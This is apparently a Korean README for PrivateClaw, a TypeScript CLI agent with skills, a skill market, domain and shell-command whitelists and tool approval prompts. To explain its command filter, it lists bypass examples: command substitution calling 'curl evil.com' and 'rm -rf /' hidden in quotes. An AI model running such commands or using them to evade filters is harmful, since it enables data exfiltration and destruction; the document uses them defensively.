# PrivateClaw

이 프로젝트는 Openclaw와 같은 역할을 하는 Agent를 개발하는 프로젝트입니다. OpenAI 혹은 AnthropicAI compatible LLM의 Endpoint만 연결하면 바로 agent와 대화를 할 수 있습니다.

## 주요 기능

### Skills (MD 기반 워크플로우)

마크다운 기반 스킬 시스템을 통해 LLM의 동작을 커스터마이즈할 수 있습니다. `skills/<name>/skill.md` 파일에 워크플로우를 작성하고 config에 등록하면, LLM이 `use_skill` 도구로 스킬을 로드하여 지시에 따라 동작합니다.

**활성 스킬 스택 (Active Skill Stack):** 로드된 스킬은 대화 히스토리가 아니라 **시스템 프롬프트에 고정**되는 LIFO 스택에 쌓입니다. sliding window가 오래된 메시지를 잘라내도 스킬 내용은 LLM 컨텍스트에서 사라지지 않으며, 긴 멀티스텝 작업 중에도 워크플로우를 끝까지 유지할 수 있습니다. 스킬이 또 다른 스킬을 호출하면(예: 인증 갱신 서브루틴) push되고, `exit_skill`을 호출하면 pop되어 상위 스킬로 복귀합니다. 중첩 깊이는 `skillMaxDepth`로 설정합니다 (기본 5).

```json
{
  "skillMaxDepth": 5
}
```

```json
{
  "skills": [
    {
      "name": "failure-analysis",
      "description": "서비스 장애나 에러 로그를 분석하여 근본 원인과 해결 방안을 제시합니다."
    },
    {
      "name": "file-upload",
      "description": "파일(이미지, PDF, CSV 등)과 JSON 데이터를 multipart/form-data로 API에 업로드합니다."
    }
  ],
  "skillsDir": "./skills"
}
```

스킬 문서 예시 (`skills/failure-analysis/skill.md`):

```markdown
# Failure Analysis

## Workflow

1. 로그 파일이 제공된 경우, file_read로 로그를 읽습니다.
2. Connection 관련 에러인 경우: 네트워크 문제로 판단합니다.
3. Timeout 에러인 경우: 서버 응답 지연으로 판단합니다.
4. 분석 결과를 에러 유형, 근본 원인, 권장 조치 형식으로 요약합니다.
```

파일 업로드 스킬 예시 (`skills/file-upload/skill.md`):

```markdown
# File Upload API

## Workflow

1. 사용자에게 업로드할 파일 경로와 함께 전송할 데이터(payload)를 확인합니다.
2. JSON 데이터가 있으면 formData.fields.data에 JSON.stringify한 문자열로 넣습니다.
3. 파일은 formData.files 배열에 fieldName, filePath를 지정합니다.
4. api_call 도구를 호출합니다. Content-Type 헤더는 직접 설정하지 않습니다.
5. 응답 status와 body를 확인하여 결과를 사용자에게 알립니다.
```

LLM은 `use_skill` 도구로 스킬을 로드한 뒤 워크플로우에 따라 `api_call`의 `formData` 파라미터를 구성합니다. 파일 업로드가 필요한 상황에서 `file-upload` 스킬을 사용하면 LLM이 올바른 multipart 요청 구조를 자동으로 만듭니다.

### 대화형 스킬 생성 (create_skill)

`create_skill` 도구를 사용하면 LLM과 대화하면서 새로운 스킬을 만들 수 있습니다. 스킬의 워크플로우를 직접 작성하는 대신, 원하는 작업을 설명하면 LLM이 적절한 `skill.md` 파일을 생성하고 config에 자동으로 등록합니다.

```
사용자: 로그 분석하는 스킬 만들어줘
LLM: 어떤 종류의 로그를 분석하나요? 어떤 단계로 진행하면 좋을까요?
사용자: 서버 에러 로그. 패턴 분석 → 원인 추론 → 요약
LLM: → create_skill 호출
     → skills/error-log-analysis/skill.md 생성 + config 등록 완료
```

생성된 스킬은 `/reload` 후 즉시 사용할 수 있습니다.

### Skill Market (온라인 스킬 저장소)

원격 **GitHub 리포지토리**를 skill market으로 설정하면, 다른 사용자가 만든 스킬을 검색·설치·업데이트할 수 있습니다. `skillMarketUrl`은 **GitHub 스타일 URL만 지원**합니다 — 공개 github.com 또는 GitHub Enterprise(GHE) 인스턴스. 임의 정적 파일 서버는 지원 대상이 아닙니다.

```json
{
  "skillMarketUrl": "https://github.com/your-org/privateclaw-skills",
  "skillMarketBranch": "main"
}
```

LLM에게 "스킬 시장에서 이메일 관련 스킬 찾아줘"처럼 요청하면 `search_online_skill`이 태그 기반으로 후보를 추리고, `install_online_skill`이 의존성까지 포함해 한 번에 내려받습니다. 설치 직후 config는 자동으로 reload되므로 사용자가 직접 `/reload`를 부르지 않아도 다음 턴부터 즉시 사용 가능합니다.

#### `index.md` 포맷 (마켓 운영자가 관리)

마켓 리포의 루트에 있는 `index.md`는 다음 5개 컬럼의 마크다운 테이블입니다. Name과 Description을 제외한 세 컬럼은 선택(비워두면 기본 동작)입니다.

```markdown
| Name | Description | Tags | Version | Dependencies |
|------|-------------|------|---------|--------------|
| email-sender    | Send transactional emails via SMTP | email, send, notify | 1.2.0 | template-engine, smtp-client |
| template-engine | Mustache-style rendering            | template, render    | 0.9.0 |                              |
| smtp-client     | SMTP transport layer                | smtp, transport     | 1.0.1 |                              |
| jira-export     | Export Jira issues to CSV           | jira, ticket, export| 2.0.1 |                              |
| shared-utility  | Multi-purpose helper (no tags)      |                     |       |                              |
```

- **Name** / **Description**: 필수
- **Tags**: 쉼표 구분 lowercase. 검색 시 OR 매칭의 키. 빈 셀은 "태그 없음"으로 모든 검색에서 반환됨(universal)
- **Version**: `major.minor.patch` 고정 포맷. 빈 셀은 "비교 불가 → 덮어쓰기 금지"
- **Dependencies**: 쉼표 구분 스킬 이름. 설치 시 이 스킬들도 자동 해석/설치

2컬럼 / 3컬럼 / 4컬럼의 구형 `index.md`도 계속 파싱됩니다 — 누락된 뒤쪽 컬럼은 각각 기본값(빈 태그/버전/의존성)으로 처리.

#### 태그 기반 검색

LLM은 사용자 의도에서 lowercase 태그를 추론해 `search_online_skill({tags: [...]})` 로 호출합니다. OR 매칭이라 태그 하나라도 일치하면 결과에 포함됩니다. 태그가 없는 universal 스킬은 모든 쿼리에서 반환됩니다.

```
"이메일 보내는 스킬 찾아줘" → tags: ["email", "send"]
→ email-sender (email, send 매치), shared-utility (universal)
```

#### 버전 관리와 업데이트

- 설치 시 원격 `index.md`의 `Version` 값이 **로컬 `privateclaw.config.json`의 `skills[].version`** 에 저장됩니다
- 다시 설치 요청이 들어오면:
  - 로컬 없음 → 설치
  - 로컬 있음 + 원격 version > 로컬 version → **덮어쓰기** (사용자 approval 프롬프트 필수)
  - 로컬 있음 + 원격 version ≤ 로컬 version → "up to date", 건드리지 않음
  - 한쪽이라도 version 정보 누락 → 안전하게 skip
- Pre-release 태그(`1.0.0-beta`)나 range(`>=1.0`)는 v1 스코프 외 — 순수 `major.minor.patch`만

#### 의존성 자동 설치

`Dependencies` 컬럼에 명시된 스킬은 DFS로 해석되어 **topological order**(deps 먼저, 대상 마지막)로 설치됩니다.

- 이미 설치된 deps는 version 비교 후 스킵 또는 업데이트
- **순환 의존성**(`A → B → A`)은 I/O 전에 감지되어 오류 반환 — 아무것도 설치되지 않음
- **누락 의존성**(market index에 없음)도 사전 검증되어 반환 오류에 `Missing skill "ghost" (required by a)` 처럼 경로를 명시
- 모든 cascade가 단일 `install_online_skill` 호출에 포함되므로 approval 프롬프트는 **한 번만** 표시. 결과 메시지에 `Installed: a v1.0.0, b v1.0.0 | Up-to-date (skipped): c v1.0.1` 형식으로 내역이 나옵니다

#### 자동 reload & 디스크 기반 `use_skill`

- 설치 성공 시 `install_online_skill`이 내부적으로 config reload를 트리거하여 LLM이 `reload_config`를 별도로 호출하지 않아도 다음 턴부터 신규 스킬이 system prompt에 노출됩니다
- 같은 턴 안에서도 `use_skill`이 **디스크 기반 validation**(skills 디렉토리에 skill.md가 존재하는지)으로 동작하기 때문에, "설치 → 곧바로 사용" 시나리오도 한 턴 안에서 완결됩니다

#### URL 해석 규칙 (자동 감지)

| `skillMarketUrl` | 실제 raw 경로 |
|--|--|
| `https://github.com/owner/repo` | `https://raw.githubusercontent.com/owner/repo/{branch}/index.md` |
| `https://github.company.com/owner/repo` (GHE) | `https://github.company.com/owner/repo/raw/{branch}/index.md` |

`github.com` 호스트면 별도 raw 서브도메인(`raw.githubusercontent.com`)으로, 그 외 호스트에서 `{host}/{owner}/{repo}` 형식이면 GHE로 판단해 `/raw/` 서브패스로 요청합니다. GHE는 공개 github.com과 달리 raw 전용 서브도메인이 없어 같은 호스트에서 raw content를 제공합니다.

#### 설정 옵션

- **`skillMarketUrl`** (선택): 스킬 마켓 리포지토리 URL. `github.com` 또는 GHE 호스트의 `{scheme}://{host}/{owner}/{repo}` 형태.
- **`skillMarketBranch`** (기본값: `"main"`): 기본 브랜치. `master` 기반 오래된 리포나 특정 릴리즈 브랜치를 쓸 경우 명시.

#### Private 리포지토리 인증

private 리포는 `raw.githubusercontent.com`(공개 GitHub) 또는 GHE 호스트에 대해 Authorization 헤더가 필요합니다. `set_header` 툴이나 config의 `security.defaultHeaders`로 설정:

```json
{
  "skillMarketUrl": "https://github.com/your-org/private-skills",
  "security": {
    "defaultHeaders": {
      "raw.githubusercontent.com": {
        "Authorization": "Bearer ghp_YourPersonalAccessToken"
      }
    }
  }
}
```

GHE private 리포라면 GHE 호스트를 키로 지정:

```json
"security": {
  "defaultHeaders": {
    "github.company.com": {
      "Authorization": "Bearer <gheToken>"
    }
  }
}
```

토큰 스코프는 `repo` 읽기 권한만 있으면 됩니다. 접근 실패 시 `search_online_skill` / `install_online_skill`이 명시적 에러 메시지로 원인을 돌려줍니다 (HTTP status + 설정 힌트).

### 도메인 화이트리스트 보안

Setting에 정해진 domain을 제외하고는 LLM이 어떠한 요청을 하더라도 연결을 차단합니다. 서브도메인 자동 매칭과 와일드카드(`*.example.com`)를 지원합니다.

```json
{
  "security": {
    "allowedDomains": ["localhost", "google.com", "*.api.internal.com"]
  }
}
```

- `google.com` → `google.com`, `www.google.com`, `api.google.com` 모두 허용
- `*.example.com` → 서브도메인만 허용 (`example.com` 자체는 불허)

### 쉘 명령어 화이트리스트

`shell_exec`를 통한 도메인 제한 우회(예: `curl`, `wget`)를 방지하기 위해, 실행 가능한 명령어를 화이트리스트로 제한할 수 있습니다. 따옴표 인식 파서로 다음 우회 기법을 차단합니다:

- 커맨드 치환 `$(curl evil.com)`, 백틱 `` `curl evil.com` ``
- 쉘 연산자를 따옴표 안에 숨기기 (`echo 'hello; rm -rf /'` — `;`가 따옴표 안이면 분리하지 않음)
- 환경변수 할당으로 커맨드 감추기 (`FOO=bar curl evil.com` — `curl`로 정상 인식)
- 경로 우회 (`/usr/bin/curl` → `curl`로 인식)
- 리다이렉션 타겟은 커맨드가 아닌 파일로 처리 (`ls > /etc/passwd`의 `/etc/passwd`는 화이트리스트 대상 아님)

사용 중인 OS에 맞는 명령어를 설정하세요.

**Linux / macOS:**
```json
{
  "security": {
    "allowedCommands": ["ls", "cat", "grep", "find", "echo", "head", "tail", "sed", "wc", "sort"]
  }
}
```

**Windows (PowerShell):**
```json
{
  "security": {
    "allowedCommands": ["Get-ChildItem", "Get-Content", "Select-String", "Write-Output", "Sort-Object", "Where-Object"]
  }
}
```

- `allowedCommands`가 비어있으면(`[]`) 모든 명령어 허용 (기본값)
- `&&`, `||`, `;`, `|`로 연결된 명령어도 각각 검증
- LLM은 현재 OS를 자동 감지하여 해당 플랫폼의 명령어를 사용합니다
- `shell_exec`는 비동기 `spawn`으로 실행되어 장시간 명령이 이벤트 루프를 막지 않으며, 타임아웃 시 `SIGTERM` → `SIGKILL` 에스컬레이션으로 정리됩니다

### Tool 시스템

빌트인 도구 목록:

| 도구 | 설명 |
|------|------|
| `file_read` | 파일 내용 읽기 (스킬 파일은 `use_skill`을 통해서만 접근 가능하도록 차단) |
| `file_write` | 파일 내용 쓰기 (디렉토리 자동 생성) |
| `file_update` | 기존 파일 수정, unified diff (`@@` 헝크) 반환 |
| `shell_exec` | 쉘 명령어 실행 (Windows/Mac/Linux 호환, 비동기) |
| `web_fetch` | URL의 내용을 가져오기 (도메인 화이트리스트 적용) |
| `api_call` | HTTP API 호출 — GET, POST, PATCH, PUT, DELETE 지원 (도메인 화이트리스트 적용) |
| `use_skill` | 등록된 스킬을 활성 스킬 스택에 push |
| `exit_skill` | 현재 스킬을 pop, 상위 스킬로 복귀 (또는 스킬 모드 종료) |
| `create_skill` | 대화를 통해 새로운 스킬을 생성하고 config에 자동 등록 |
| `sync_skills` | `skills/` 디렉토리와 config를 동기화 (신규 감지, 고아 항목 정리) |
| `set_header` | 도메인별 기본 HTTP 헤더를 config에 저장 |
| `reload_config` | 실행 중 config 파일을 다시 읽음 |
| `browser_auth` | 브라우저를 열어 로그인 → 쿠키 자동 캡처 |
| `search_online_skill` | Skill market에서 스킬 검색 |
| `install_online_skill` | Skill market에서 스킬 다운로드 및 설치 |
| `delegate` | 전문 모델(specialist)에게 작업 위임 |

### Tool 실행 승인 시스템

외부 효과를 가지는 도구(`shell_exec`, `file_write`, `api_call` 등) 실행 전에 사용자 승인을 요구합니다. 읽기 전용이거나 메타 성격의 도구(`use_skill`, `exit_skill`, `reload_config`, `sync_skills`)는 승인을 생략합니다.

```
⚠ Tool "shell_exec" wants to execute:
{"command":"ls -l"}
  [y] Allow once  [a] Allow always  [n] Deny
```

- `y` — 1회만 허용 (다음 호출 시 다시 물어봄)
- `a` — 해당 도구를 영구적으로 허용
- `n` — 거절, 에이전트 즉시 중단 후 입력 대기로 복귀

파일 쓰기/수정 시에는 승인 프롬프트에 **변경 diff 미리보기**가 함께 표시됩니다.

### API Call과 기본 헤더

도메인별 기본 헤더를 설정하여, LLM이 매번 토큰을 지정하지 않아도 자동으로 주입됩니다. LLM이 헤더를 직접 전달하면 기본값을 덮어씁니다.

```json
{
  "security": {
    "defaultHeaders": {
      "api.internal.com": {
        "Authorization": "Bearer sk-abc123"
      }
    }
  }
}
```

### Tool 결과 요약 표시

`web_fetch`, `api_call` 등 대량의 데이터를 반환하는 도구의 결과는 CLI에서 자동으로 요약됩니다. 전체 내용은 LLM에 그대로 전달되므로 분석에는 영향이 없습니다.

```
[tool:result] web_fetch status=200, body=78.5 KB
<!doctype html><html itemscope="" itemtype="http://schema.org/We... [1523 lines, 78.5 KB total]
```

- HTTP 결과: `status`, `body 크기`, 본문 미리보기 (콘솔 2줄 분량)
- 기타 도구: JSON 결과를 콘솔 2줄로 truncation
- 에러: 전체 메시지 표시

### 응답 품질 관리

LLM 응답의 정확성을 높이기 위한 설정을 제공합니다.

```json
{
  "provider": {
    "temperature": 0.3,
    "reflectionLoops": 2
  }
}
```

- **temperature** (0.0~2.0, 기본값: 0.7): LLM의 창의성 수준. 낮을수록 보수적이고 정확한 답변.
- **reflectionLoops** (0~5, 기본값: 2): 응답 후 자기 검증 횟수. 0이면 비활성화.

Self-reflection loop는 LLM이 자신의 응답을 검토하여, 도구 결과에 없는 정보를 날조하지 않았는지, 사용자의 질문에 정확히 답했는지 확인합니다. 검토 결과 문제가 없으면 `[LGTM]`으로 즉시 통과하고, 수정이 필요하면 수정된 응답을 다시 한번 검토합니다. 120B 이상의 모델에서 효과적입니다.

### 대화 이력 관리

세션 메타는 `<id>.json`에, 메시지는 `<id>.messages.jsonl`에 append-only로 저장됩니다. 이전 형식(메타 안에 messages 배열)으로 저장된 세션은 최초 append 시 자동 마이그레이션됩니다. 대용량 세션에서도 추가 쓰기는 선형 시간으로 끝납니다.

토큰 사용량 최적화를 위해 sliding window 방식으로 최근 N개의 메시지만 LLM에 전송합니다:

```json
{
  "session": {
    "sessionDir": "./.privateclaw/sessions",
    "maxHistoryMessages": 20
  }
}
```

- **maxHistoryMessages** (기본값: 20): LLM에 전송할 최대 메시지 수. 0이면 제한 없음.
- 오래된 대화 이력이 자동으로 제거되어 토큰 비용 절감 및 이전 실패 기록에 의한 LLM 고착 방지.
- 큰 tool 결과(>10KB)는 다음 스텝의 LLM 컨텍스트에서만 잘리고, 세션에는 전체 본문이 보존됩니다.
- 활성 스킬 스택은 sliding window에 영향을 받지 않으며, 세션에 `activeSkillNames`로 저장되어 다음 세션에서 복원됩니다.
- `/clear` 명령어로 대화 이력과 스킬 스택을 즉시 초기화할 수 있습니다.

### 멀티 프로바이더 지원

OpenAI, Anthropic, Google (Gemini), Ollama를 지원합니다. OpenAI/Anthropic compatible API를 제공하는 어떤 엔드포인트든 연결 가능합니다. Chat Completions API를 사용하므로 대부분의 호환 서버(vLLM 등)에서 동작합니다.

Google Gemini 사용 예시:
```json
{
  "provider": {
    "type": "google",
    "apiKey": "YOUR_GOOGLE_API_KEY",
    "model": "gemini-2.5-flash-preview-05-20"
  }
}
```

> **참고:** Google provider는 `baseURL`이 선택사항입니다 (기본값: Google AI API). OpenAI/Anthropic도 공식 API 사용 시 `baseURL`을 생략할 수 있습니다.

### 멀티 모델 오케스트레이션

메인 모델이 작업 특성에 따라 전문 모델(specialist)에게 위임할 수 있습니다. 추론, 코딩, 수학 등 특정 영역에 강한 모델을 활용하여 응답 품질을 높이고, 메인 모델의 토큰 부담을 줄입니다.

```json
{
  "provider": {
    "type": "ollama",
    "model": "gpt-oss-120b"
  },
  "specialists": [
    {
      "role": "reasoning",
      "type": "ollama",
      "model": "gemma3:27b",
      "description": "Complex reasoning and multi-step logic"
    },
    {
      "role": "coding",
      "type": "ollama",
      "model": "qwen2.5-coder:32b",
      "description": "Code generation, review, and debugging"
    }
  ]
}
```

- 메인 모델이 `delegate` tool로 specialist에게 작업을 위임
- Specialist는 텍스트만 반환 (도구 접근 없음, 비용 절감)
- `specialists`가 비어있으면 메인 모델이 혼자 모든 작업 처리 (기존 동작)
- Specialist는 대화 이력을 보지 않으므로, 메인 모델이 충분한 컨텍스트를 포함하여 위임

### 폐쇄망(Air-gapped) 지원

외부 인터넷 연결 없이 완전히 격리된 네트워크 환경에서도 동작합니다. 모든 LLM 연결은 사용자가 지정한 내부 엔드포인트(`baseURL`)로 직접 통신하며, 외부 서비스(Vercel Gateway 등)를 경유하지 않습니다.

## 구현 예정 기능

아래 기능은 아직 구현되지 않았으며, 향후 추가될 예정입니다.

### MCP 연동 (예정)

MCP(Model Context Protocol) 서버 연동을 통해 외부 도구와의 통합 지원.

### Sandbox 실행 환경 (예정)

Agent가 코드를 실행할 때 격리된 샌드박스(Docker 컨테이너) 환경에서 동작하여 호스트 시스템을 보호. 현재는 `shell_exec`가 호스트에서 직접 실행되며, Tool 승인 시스템으로 위험한 명령을 사전에 차단할 수 있습니다.

### 플러그인 아키텍처 (부분 구현)

Skill market(`search_online_skill` / `install_online_skill`)으로 원격 리포지토리에서 스킬을 검색·설치하는 기본 경로는 구현되어 있습니다. 향후 버전 핀, 서명 검증, 종속성 관리 등 완전한 플러그인 생태계로 확장 예정.

## 설치 및 실행

### Standalone 바이너리 (Node.js 불필요)

[Releases](https://github.com/fanpa/PrivateClaw/releases) 페이지에서 OS에 맞는 바이너리를 다운로드하면 Node.js 설치 없이 바로 실행할 수 있습니다.

| 파일 | 플랫폼 |
|------|--------|
| `privateclaw-linux-x64` | Linux (x64) |
| `privateclaw-darwin-arm64` | macOS (Apple Silicon) |
| `privateclaw-windows-x64.exe` | Windows (x64) |

```bash
# Linux/macOS
chmod +x privateclaw-linux-x64
./privateclaw-linux-x64 chat

# Windows PowerShell
.\privateclaw-windows-x64.exe chat
```

처음 실행 시 config 파일이 없으면 자동으로 초기 설정이 생성됩니다:
```bash
./privateclaw-linux-x64 chat
# → Config file not found. Running initialization...
# → privateclaw.config.json + skills/ 자동 생성
# → config 파일을 편집한 뒤 다시 실행하세요
```

또는 수동으로 초기화:
```bash
privateclaw init
```

### Skill 자동 감지

`skills/` 디렉토리에 skill 폴더가 있지만 config에 등록되지 않은 경우, 실행 시 자동으로 감지하여 등록합니다. 직접 skill 폴더를 만들고 `skill.md`를 작성하면 config 수정 없이 바로 사용됩니다.

### 소스에서 설치

### 요구사항

- Node.js 22 이상
- pnpm (`npm install -g pnpm`)

### Node.js 설치 (nvm 사용)

각 OS에 맞는 방법으로 [nvm](https://github.com/nvm-sh/nvm) (Node Version Manager)을 설치한 후 Node.js를 설치합니다.

**macOS / Linux:**

```bash
curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.3/install.sh | bash
source ~/.bashrc   # 또는 source ~/.zshrc
nvm install 22
nvm use 22
```

**Windows (PowerShell 관리자 모드):**

Windows에서는 [nvm-windows](https://github.com/coreybutler/nvm-windows)를 사용합니다.

```powershell
# winget으로 설치 (Windows 10/11)
winget install CoreyButler.NVMforWindows

# 또는 https://github.com/coreybutler/nvm-windows/releases 에서 설치 파일 다운로드
```

설치 후 새 터미널을 열고:

```powershell
nvm install 22
nvm use 22
node -v   # v22.x.x 확인
npm install -g pnpm
```

> **참고:** nvm 없이 [Node.js 공식 사이트](https://nodejs.org/)에서 직접 설치해도 됩니다.

### 설치

```bash
git clone https://github.com/fanpa/PrivateClaw.git
cd PrivateClaw
pnpm install
```

### 설정

```bash
cp privateclaw.config.example.json privateclaw.config.json
```

`privateclaw.config.json`을 편집하여 LLM 프로바이더를 설정합니다:

```json
{
  "provider": {
    "type": "ollama",
    "baseURL": "http://localhost:11434/api",
    "model": "llama3.2",
    "temperature": 0.3,
    "reflectionLoops": 2
  },
  "security": {
    "allowedDomains": ["localhost"],
    "defaultHeaders": {}
  }
}
```

지원되는 프로바이더 타입: `openai`, `anthropic`, `google`, `ollama`

> **주의:** `allowedDomains`를 설정하는 경우, LLM 프로바이더의 도메인(예: `localhost`)도 반드시 포함해야 합니다. 미포함 시 LLM 연결이 차단됩니다.

### 빌드 및 PATH 등록

```bash
pnpm setup    # pnpm 글로벌 bin 디렉토리 설정 (최초 1회)
source ~/.zshrc  # 또는 source ~/.bashrc

pnpm run setup   # 빌드 + 글로벌 링크
```

이후 어디서든 `privateclaw` 명령어로 실행할 수 있습니다:

```bash
privateclaw init                    # 초기 설정 생성 (config + skills)
privateclaw chat                    # 새 대화 시작
privateclaw chat -s <session-id>    # 이전 세션 이어서 대화
privateclaw sessions                # 저장된 세션 목록 보기
privateclaw domains                 # 허용된 도메인 목록 조회
privateclaw run -p "프롬프트"        # 비대화형 단일 실행
privateclaw run -s skill-name       # 스킬 기반 실행
privateclaw auth -u <login-url>    # 브라우저 로그인 → 쿠키 캡처
```

### 채팅 내 명령어

대화 중 사용할 수 있는 슬래시 명령어:

| 명령어 | 설명 |
|--------|------|
| `/help` | 사용 가능한 명령어 목록 표시 |
| `/domains` | 현재 허용된 도메인 목록 조회 |
| `/reload` | config 파일을 다시 읽어 설정 반영 (재시작 불필요) |
| `/skill` | 현재 활성 스킬 스택 표시 |
| `/skill pop` | 스택의 최상위 스킬을 pop |
| `/skill clear` | 스킬 스택 전체 초기화 |
| `/clear` | 대화 이력과 스킬 스택을 모두 초기화 |
| `/quit` | 대화 종료 |

`privateclaw.config.json`을 수정한 경우 (예: 도메인 추가, 프로바이더 변경, 스킬 등록), 채팅 중 `/reload`를 입력하면 재시작 없이 즉시 반영됩니다.

### 비대화형 실행 (Headless Mode)

`privateclaw run` 명령어로 대화 없이 단일 작업을 실행하고 결과를 stdout으로 출력합니다. 모든 도구는 자동 승인됩니다.

```bash
# 프롬프트 기반 실행
privateclaw run -p "현재 시스템 상태를 확인해줘"

# 스킬 기반 실행 (-s로 지정한 스킬이 활성 스킬 스택에 pre-load됨)
privateclaw run -s failure-analysis -p "이 로그를 분석해줘: /var/log/app.log"

# 결과를 파일로 저장
privateclaw run -s jira-daily-report > report.txt
```

OS의 cron과 조합하면 자동화된 스케줄링이 가능합니다:

```bash
# 매일 오전 9시에 Jira 이슈 정리 리포트 생성
0 9 * * * cd /path/to/project && privateclaw run -s jira-daily-report > /var/reports/daily.txt
```

| 옵션 | 설명 |
|------|------|
| `-p, --prompt <text>` | 실행할 프롬프트 |
| `-s, --skill <name>` | 실행할 스킬 이름 |
| `-c, --config <path>` | config 파일 경로 (기본: privateclaw.config.json) |
| `-v, --verbose` | 상세 출력 모드 |

### 브라우저 인증 (Cookie Capture)

`privateclaw auth` 명령어로 브라우저를 열어 로그인한 뒤, 쿠키를 자동으로 캡처하여 config에 저장합니다.

```bash
# 브라우저 열어 로그인 → 쿠키 자동 저장
privateclaw auth -u https://jira.company.com/login

# 특정 URL로 리다이렉트될 때까지 대기
privateclaw auth -u https://jira.company.com/login -w "*/dashboard*"
```

캡처된 쿠키는 `security.defaultHeaders`에 자동 저장되어, 이후 `api_call`에서 해당 도메인에 쿠키가 자동 첨부됩니다.

> **요구사항:** Chrome 또는 Edge 브라우저가 설치되어 있어야 합니다.

### 개발 모드

빌드 없이 바로 실행하려면:

```bash
pnpm dev -- chat
```

## 기술 스택

| 구분 | 기술 | 비고 |
|------|------|------|
| 언어 | TypeScript | Node.js 런타임 |
| LLM 통합 | Vercel AI SDK (`ai`) | Chat Completions API 사용 (Gateway 미경유) |
| CLI | Commander.js | CLI 인터페이스 |
| 세션 저장 | JSON + JSONL | 메타는 JSON, 메시지는 append-only JSONL |
| 브라우저 자동화 | Puppeteer | `browser_auth`, `privateclaw auth` |
| 스키마 | Zod | 타입 안전한 설정/도구 정의 |
| 테스트 | Vitest | 304개 단위 테스트 |
| 빌드 | TypeScript + Bun | 단일 바이너리 배포 (linux-x64 · windows-x64 · darwin-arm64) |
| 패키지 관리 | pnpm | |
